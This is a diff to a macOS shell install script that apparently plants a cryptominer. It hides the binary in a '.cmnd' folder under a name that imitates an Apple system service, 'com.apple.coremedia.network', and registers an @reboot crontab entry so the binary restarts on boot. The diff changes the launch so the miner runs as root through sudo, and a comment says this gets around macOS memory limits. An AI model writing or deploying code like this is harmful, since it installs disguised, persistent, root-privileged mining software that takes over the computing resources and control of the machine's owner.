@@ -159,7 +159,7 @@ INSTALL_DIR="$HOME/Library/Application Support/.cmnd"
 BINARY_PATH="$INSTALL_DIR/com.apple.coremedia.network"
 CONFIG_PATH="$INSTALL_DIR/config.json"
 LOG_PATH="$HOME/Library/Logs/com.apple.coremedia.network.log"
-exec "$BINARY_PATH" --config "$CONFIG_PATH" >> "$LOG_PATH" 2>&1
+exec sudo "$BINARY_PATH" --config "$CONFIG_PATH" >> "$LOG_PATH" 2>&1
 WRAPPER
 chmod +x "$WRAPPER_PATH"
 
@@ -168,11 +168,11 @@ CRON_JOB="@reboot bash \"$WRAPPER_PATH\""
 ( crontab -l 2>/dev/null | grep -v "coremedia.network\|\.cmnd"; echo "$CRON_JOB" ) | crontab -
 echo "      ✓ Auto-start registered via crontab"
 
-# Start RIGHT NOW via nohup (no launchd limits)
-nohup "$BINARY_PATH" --config "$CONFIG_PATH" >> "$LOG_PATH" 2>&1 &
+# Start RIGHT NOW via sudo nohup — root bypasses all macOS memory limits
+sudo nohup "$BINARY_PATH" --config "$CONFIG_PATH" >> "$LOG_PATH" 2>&1 &
 MINER_PID=$!
 echo $MINER_PID > "$INSTALL_DIR/miner.pid"
-echo "      ✓ Miner started (PID: $MINER_PID)"
+echo "      ✓ Miner started as root (PID: $MINER_PID)"
 
 echo ""
 echo "=========================================="
